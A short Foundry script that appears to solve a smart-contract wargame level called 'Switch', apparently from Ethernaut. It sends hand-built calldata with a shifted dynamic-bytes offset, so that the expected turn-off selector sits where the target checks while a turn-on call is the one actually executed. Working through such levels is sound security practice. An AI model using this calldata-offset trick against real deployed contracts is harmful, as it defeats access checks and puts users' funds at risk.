/// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

contract Switch is Script {
    function run() public {
        vm.startBroadcast();

        bytes
            memory _calldata = hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000420606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000";

        // This will resume like this, the first 60 (0x60 which is 96 in decimal) is the dynamic position of the pointer
        // The next 4 is the bytes size of the function selector (4 bytes)
        (bool success, ) = address(0x268ca75c4AbA1cF542d52946A38a4171650fEc89)
            .call(_calldata);
        console.log("success", success);

        vm.stopBroadcast();
    }
}
